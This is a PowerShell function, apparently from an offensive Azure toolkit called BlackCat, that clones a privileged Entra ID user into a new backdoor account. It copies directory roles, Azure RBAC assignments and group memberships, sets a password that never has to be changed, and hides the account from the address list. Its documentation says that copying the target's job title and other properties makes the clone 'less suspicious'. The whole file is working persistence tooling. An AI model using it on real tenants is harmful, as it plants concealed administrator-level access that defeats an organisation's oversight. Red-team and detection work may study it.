function Copy-PrivilegedUser {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false, ParameterSetName = 'TargetObjectId')]
        [string]$TargetObjectId,

        [Parameter(Mandatory = $false, ParameterSetName = 'TargetName')]
        [string]$TargetName,
        
        [Parameter(Mandatory = $false, ParameterSetName = 'TargetUserPrincipalName')]
        [ValidatePattern('^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', ErrorMessage = "The value '{1}' is not a valid UPN format")]
        [string]$TargetUserPrincipalName,
        
        [Parameter(Mandatory = $false)]
        [string]$NewDisplayName,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', ErrorMessage = "The value '{1}' is not a valid UPN format")]
        [string]$NewUserPrincipalName,

        [Parameter(Mandatory = $true)]
        [SecureString]$NewPassword,
        
        [Parameter(Mandatory = $false)]
        [switch]$IncludeEntraRoles,
        
        [Parameter(Mandatory = $false)]
        [switch]$IncludeAzureRbacRoles,
        
        [Parameter(Mandatory = $false)]
        [switch]$IncludeGroupMemberships,

        [Parameter(Mandatory = $false)]
        [switch]$CopyUserProperties
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ResourceTypeName 'MSGraph'
        
        $results = [PSCustomObject]@{
            TargetUser          = $null
            NewUser             = $null
            EntraRoles          = @()
            AzureRbacRoles      = @()
            GroupMemberships    = @()
            AppPermissions      = @()
        }
    }

    process {
        try {
            Write-Host "🔍 Identifying target user..." -ForegroundColor Cyan
            
            switch ($PSCmdlet.ParameterSetName) {
                'TargetObjectId' {
                    $targetUser = Get-EntraInformation -ObjectId $TargetObjectId
                }
                'TargetName' {
                    $targetUser = Get-EntraInformation -Name $TargetName
                }
                'TargetUserPrincipalName' {
                    $targetUser = Get-EntraInformation -UserPrincipalName $TargetUserPrincipalName
                }
            }
            
            if (-not $targetUser) {
                throw "Target user not found. Please check your input parameters."
            }
            
            $results.TargetUser = $targetUser
            Write-Host "✅ Target user identified: $($targetUser.DisplayName) ($($targetUser.UserPrincipalName))" -ForegroundColor Green
            
            if (-not $NewDisplayName) {
                $NewDisplayName = $targetUser.DisplayName
                Write-Host "  📝 Using target user's display name: $NewDisplayName" -ForegroundColor Cyan
            }
            
            if (-not $NewUserPrincipalName) {
                $isExternal = $targetUser.UserPrincipalName -match "#EXT#"
                Write-Verbose "Target user is external: $isExternal"
                
                Write-Verbose "Getting sample users to determine organization naming convention..."
                $internalUsers = Invoke-MsGraph -relativeUrl "users?`$filter=userType eq 'Member'&`$top=5" -NoBatch
                
                if ($internalUsers -and $internalUsers.Count -gt 0) {
                    $upnPattern = $null
                    
                    foreach ($user in $internalUsers) {
                        if ($user.userPrincipalName -notmatch "#EXT#" -and 
                            $user.userPrincipalName -match "@" -and
                            $user.givenName -and $user.surname) {
                            $username = $user.userPrincipalName.Split('@')[0]
                            $domain = $user.userPrincipalName.Split('@')[1]
                            $orgDomain = $domain
                            
                            $escapedFirstName = [regex]::Escape($user.givenName)
                            $escapedLastName = [regex]::Escape($user.surname)
                            
                            if ($username -match "^$escapedFirstName[\.\-_]$escapedLastName") {
                                $upnPattern = "firstname.lastname"
                                break
                            }
                            elseif ($user.givenName -and $user.surname -and 
                                $username -match "^$([regex]::Escape($user.givenName[0]))$escapedLastName") {
                                $upnPattern = "firstinitiallastname"
                                break
                            }
                            elseif ($user.surname -and $user.givenName -and 
                                $username -match "^$escapedLastName$([regex]::Escape($user.givenName[0]))") {
                                $upnPattern = "lastnamefi"
                                break
                            }
                        }
                    }
                    
                    if (-not $upnPattern) {
                        $upnPattern = "firstname.lastname"
                        $orgDomain = $internalUsers[0].userPrincipalName.Split('@')[1]
                    }
                    
                    Write-Verbose "Detected organization naming pattern: $upnPattern"
                    
                    $nameParts = $NewDisplayName -split ' '
                    $firstName = $nameParts[0]
                    $lastName = if ($nameParts.Count -gt 1) { $nameParts[-1] } else { "User" }
                    
                    if (-not $firstName -or $firstName.Length -eq 0) { $firstName = "User" }
                    if (-not $lastName -or $lastName.Length -eq 0) { $lastName = "Account" }
                    
                    $username = switch ($upnPattern) {
                        "firstname.lastname" { "$firstName.$lastName".ToLower() }
                        "firstinitiallastname" { 
                            if ($firstName.Length -gt 0) {
                                "$($firstName[0])$lastName".ToLower() 
                            }
                            else {
                                "u$lastName".ToLower()
                            }
                        }
                        "lastnamefi" { 
                            if ($firstName.Length -gt 0) {
                                "$lastName$($firstName[0])".ToLower() 
                            }
                            else {
                                "${lastName}u".ToLower()
                            }
                        }
                        default { "$firstName.$lastName".ToLower() }
                    }
                    
                    # Clean up username (remove special characters)
                    $username = $username -replace '[^a-z0-9\.\-_]', ''
                    
                    $NewUserPrincipalName = "$username@$orgDomain"
                    
                    Write-Host "  📝 Auto-generated UPN following organization standards: $NewUserPrincipalName" -ForegroundColor Cyan
                }
                else {
                    # Extract domain from target user
                    $targetDomain = if ($isExternal) {
                        $targetUser.UserPrincipalName -replace '.*#EXT#@', ''
                    }
                    else {
                        $targetUser.UserPrincipalName.Split('@')[1]
                    }
                    
                    $username = $NewDisplayName.ToLower() -replace '[^a-z0-9]', '.'
                    $randomSuffix = -join ((65..90) | Get-Random -Count 4 | ForEach-Object { [char]$_ }).ToLower()
                    $NewUserPrincipalName = "$username$randomSuffix@$targetDomain"
                    
                    Write-Host "  📝 Auto-generated UPN: $NewUserPrincipalName" -ForegroundColor Cyan
                }
            }
            
            # Step 2: Create the new user account
            Write-Host "👤 Creating new user account..." -ForegroundColor Cyan
            
            $createUserBody = @{
                accountEnabled    = $true
                displayName       = $NewDisplayName
                userPrincipalName = $NewUserPrincipalName
                mailNickname      = $NewUserPrincipalName.Split('@')[0]
                passwordProfile   = @{
                    forceChangePasswordNextSignIn = $false
                    password                      = ($NewPassword | ConvertFrom-SecureString -AsPlainText)
                }
            }
            
            # Copy user properties if specified
            if ($CopyUserProperties) {
                Write-Host "  Copying all user properties from target user..." -ForegroundColor Cyan
                
                # Get detailed user information from Graph API to ensure all available properties are retrieved
                $detailedTargetUser = Invoke-MsGraph -relativeUrl "users/$($targetUser.ObjectId)" -NoBatch
                
                # Properties that can be copied - expanded to include all standard user properties from Graph API
                $propertiesToCopy = @(
                    # Basic profile attributes
                    'jobTitle', 'department', 'officeLocation', 'businessPhones', 
                    'mobilePhone', 'givenName', 'surname', 'displayName',
                    'userType', 'companyName', 'employeeId', 'employeeHireDate',
                    'employeeType', 'faxNumber', 'aboutMe', 'interests',
                    'pastProjects', 'skills', 'responsibilities', 'schools',
                    
                    # Contact details
                    'otherMails', 'imAddresses', 'proxyAddresses',
                    
                    # Address information
                    'streetAddress', 'city', 'state', 'postalCode',
                    'country', 'usageLocation',
                    
                    # System settings
                    'preferredLanguage', 'externalUserState', 
                    'externalUserStateChangeDateTime', 'showInAddressList'
                )
                
                foreach ($prop in $propertiesToCopy) {
                    if ($detailedTargetUser.$prop) {
                        # Skip userPrincipalName as we've already set it
                        if ($prop -ne 'userPrincipalName') {
                            # Special case: always set showInAddressList to false for cloned users
                            if ($prop -eq 'showInAddressList') {
                                $createUserBody[$prop] = $false
                            } else {
                                $createUserBody[$prop] = $detailedTargetUser.$prop
                            }
                        }
                    }
                }
                
                # Ensure showInAddressList is set to false even if it wasn't present in the source user
                if (-not $createUserBody.ContainsKey('showInAddressList')) {
                    $createUserBody['showInAddressList'] = $false
                }
                
                Write-Host "  ✓ All user properties copied from target" -ForegroundColor Green
                Write-Host "  ✓ Set showInAddressList to false for security" -ForegroundColor Green
            }
            
            $createUserBodyJson = $createUserBody | ConvertTo-Json

            $newUserResponse = Invoke-RestMethod -Uri "$($sessionVariables.graphUri)/users" -Headers $script:graphHeader -Method POST -ContentType "application/json" -Body $createUserBodyJson
            
            $newUser = Get-EntraInformation -ObjectId $newUserResponse.id
            Write-Host "✅ New user created: $NewDisplayName ($NewUserPrincipalName)" -ForegroundColor Green
            
            $results.NewUser = $newUser
            
            # Step 3: Process Entra ID (Azure AD) roles
            if ($IncludeEntraRoles) {
                Write-Host "👑 Processing Entra ID roles..." -ForegroundColor Cyan
                $targetRoles = Get-EntraIDPermissions -ObjectId $targetUser.ObjectId
                $results.EntraRoles = $targetRoles
                
                if ($targetRoles) {
                    foreach ($role in $targetRoles) {
                        $roleDefinition = Invoke-MsGraph -relativeUrl "roleManagement/directory/roleDefinitions?`$filter=displayName eq '$($role.RoleName)'" | Select-Object -First 1
                        
                        if ($roleDefinition) {
                            $roleAssignmentBody = @{
                                "@odata.type"    = "#microsoft.graph.unifiedRoleAssignment"
                                roleDefinitionId = $roleDefinition.id
                                principalId      = $newUser.ObjectId
                                directoryScopeId = "/"
                            } | ConvertTo-Json

                            try {
                                Invoke-RestMethod -Uri "$($sessionVariables.graphUri)/roleManagement/directory/roleAssignments" -Headers $script:graphHeader -Method POST -ContentType "application/json" -Body $roleAssignmentBody
                                Write-Host "  ✅ Assigned role: $($role.RoleName)" -ForegroundColor Green
                            }
                            catch {
                                Write-Host "  ❌ Failed to assign role: $($role.RoleName). Error: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                        else {
                            Write-Host "  ⚠️ Could not find role definition for: $($role.RoleName)" -ForegroundColor Yellow
                        }
                    }
                }
                else {
                    Write-Host "  ℹ️ No Entra ID roles found for target user." -ForegroundColor Blue
                }
            }
            
            # Step 4: Process Azure RBAC role assignments
            if ($IncludeAzureRbacRoles) {
                Write-Host "🔑 Processing Azure RBAC role assignments..." -ForegroundColor Cyan
                $rbacRoles = Get-RoleAssignment -ObjectId $targetUser.ObjectId
                $results.AzureRbacRoles = $rbacRoles
                
                if ($rbacRoles) {
                    foreach ($role in $rbacRoles) {
                        # Create the role assignment using Az PowerShell or Azure CLI
                        $scope = $role.Scope
                        $roleName = $role.RoleName
                        
                        try {
                            # Use Az PowerShell module
                            New-AzRoleAssignment -ObjectId $newUser.id -RoleDefinitionName $roleName -Scope $scope | Out-Null
                            Write-Host "  ✅ Assigned RBAC role: $roleName at scope: $scope" -ForegroundColor Green
                        }
                        catch {
                            Write-Host "  ❌ Failed to assign RBAC role: $roleName. Error: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                }
                else {
                    Write-Host "  ℹ️ No Azure RBAC role assignments found for target user." -ForegroundColor Blue
                }
            }
            
            # Step 5: Process group memberships
            if ($IncludeGroupMemberships) {
                Write-Host "👥 Processing group memberships..." -ForegroundColor Cyan
                $groups = $targetUser.GroupMemberships
                $results.GroupMemberships = $groups
                
                if ($groups) {
                    $processedGroups = @{}
                    $roleNames = @()
                    
                    if ($targetRoles) {
                        $roleNames = $targetRoles | ForEach-Object { $_.RoleName }
                    }
                    
                    foreach ($groupName in $groups) {
                        if ($processedGroups.ContainsKey($groupName)) { continue }
                        $processedGroups[$groupName] = $true
                        
                        if ($roleNames -contains $groupName) {
                            Write-Host "  ⚠️ Skipping '$groupName' as it appears to be a role, not a group" -ForegroundColor Yellow
                            continue
                        }
                        
                        try {
                            Write-Verbose "Searching for group: $groupName"
                            $group = Get-EntraInformation -Name $groupName -Group
                            
                            if ($group -and $group.ObjectId) {

                                Add-GroupObject -GroupObjectId $group.ObjectId -UserPrincipalName $newUser.UserPrincipalName -ObjectType "Member"
                                Write-Host "  ✅ Added to group: $groupName" -ForegroundColor Green
                            }
                            else {
                                Write-Host "  ⚠️ Could not find group: $groupName" -ForegroundColor Yellow
                            }
                        }
                        catch {
                            Write-Host "  ❌ Failed to add to group: $groupName. Error: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                }
                else {
                    Write-Host "  ℹ️ No group memberships found for the user" -ForegroundColor Blue
                }
            }
            
            # Final summary
            Write-Host "`n📊 Operation Summary:" -ForegroundColor Cyan
            Write-Host "  Target user: $($targetUser.DisplayName) ($($targetUser.UserPrincipalName))" -ForegroundColor White
            Write-Host "  Cloned user: $NewDisplayName ($NewUserPrincipalName)" -ForegroundColor White
            Write-Host "  ✅ User cloned successfully with selected permissions" -ForegroundColor Green
            
            return $results
        }
        catch {
            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message $($_.Exception.Message) -Severity 'Error'
            return $null
        }
    }
    
    end {
        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"
    }
    
    <#
.SYNOPSIS
Clones a privileged user by creating a new user and copying permissions from a target user.

.DESCRIPTION
The Copy-PrivilegedUser function automates the process of creating a backdoor account by cloning
the permissions of a highly privileged target user. It can copy Entra ID roles, Azure RBAC role
assignments, and group memberships to the new user.

.PARAMETER TargetObjectId
The Object ID of the target user whose permissions will be cloned.

.PARAMETER TargetName
The display name of the target user whose permissions will be cloned.

.PARAMETER TargetUserPrincipalName
The User Principal Name (UPN) of the target user whose permissions will be cloned.

.PARAMETER NewDisplayName
The display name for the new user account to be created. If not specified, the target user's display name will be used.

.PARAMETER NewUserPrincipalName
The User Principal Name (UPN) for the new user account to be created. If not specified, a UPN will be automatically generated following the organization's naming standard. For external users, an internal account format will be used.

.PARAMETER NewPassword
The password for the new user account to be created.

.PARAMETER IncludeEntraRoles
When specified, copies Entra ID (Azure AD) roles from the target user to the new user.

.PARAMETER IncludeAzureRbacRoles
When specified, copies Azure RBAC role assignments from the target user to the new user.

.PARAMETER IncludeGroupMemberships
When specified, copies group memberships from the target user to the new user.

.PARAMETER CopyUserProperties
When specified, copies all available user properties from the target user to the new user, including:
basic profile attributes (job title, department, given name, surname, etc.), contact details (otherMails, 
imAddresses, proxyAddresses), address information, and system settings. The following exceptions apply:
1) OnPremises attributes (onPremisesImmutableId, onPremisesSamAccountName, onPremisesUserPrincipalName, 
   onPremisesDistinguishedName) are excluded as they cannot be set manually in Entra ID.
2) The showInAddressList property is always set to false for cloned users for security reasons,
   regardless of the original user's setting.
This makes the cloned account appear more legitimate and closely match the original user while
maintaining appropriate security precautions.

.EXAMPLE
$securePassword = ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force
Copy-PrivilegedUser -TargetUserPrincipalName "admin@contoso.com" -NewDisplayName "Service Account" -NewUserPrincipalName "svc.account@contoso.com" -NewPassword $securePassword -IncludeEntraRoles -IncludeGroupMemberships

Clones the Entra ID roles and group memberships from admin@contoso.com to a new user svc.account@contoso.com.

.EXAMPLE
$securePassword = ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force
Copy-PrivilegedUser -TargetObjectId "1a2b3c4d-1234-5678-90ab-cdef12345678" -NewDisplayName "Backup Admin" -NewUserPrincipalName "backup.admin@contoso.com" -NewPassword $securePassword -IncludeEntraRoles -IncludeAzureRbacRoles -IncludeGroupMemberships

Clones a user identified by their Object ID, copying their Entra ID roles, Azure RBAC roles, and group memberships to a new user.

.EXAMPLE
$securePassword = ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force
Copy-PrivilegedUser -TargetUserPrincipalName "director@contoso.com" -NewDisplayName "Director Assistant" -NewUserPrincipalName "director.assistant@contoso.com" -NewPassword $securePassword -IncludeEntraRoles -IncludeGroupMemberships -CopyUserProperties

Creates a new user with the same job title, department, office location and other properties as the target user, making the clone appear more legitimate and less suspicious.

.EXAMPLE
$securePassword = ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force
Copy-PrivilegedUser -TargetName "John Smith" -NewUserPrincipalName "john.smith.clone@contoso.com" -NewPassword $securePassword -IncludeEntraRoles -CopyUserProperties

Creates a new user using the target user's display name (John Smith), copying their Entra ID roles and user properties.

.EXAMPLE
$securePassword = ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force
Copy-PrivilegedUser -TargetObjectId "1a2b3c4d-1234-5678-90ab-cdef12345678" -NewPassword $securePassword -IncludeEntraRoles -IncludeGroupMemberships

Creates a new user with automatically generated display name (using target's display name) and UPN (following organization's naming standard), copying roles and group memberships.

.NOTES
- This function requires appropriate Microsoft Graph API permissions to create users and assign roles.
- The Az PowerShell module is required for assigning Azure RBAC roles.
- The function uses BlackCat module functions like Get-EntraInformation, Get-EntraIDPermissions, and Get-RoleAssignment.
- Application permission cloning is marked as simplified and may require environment-specific implementation.
#>
}
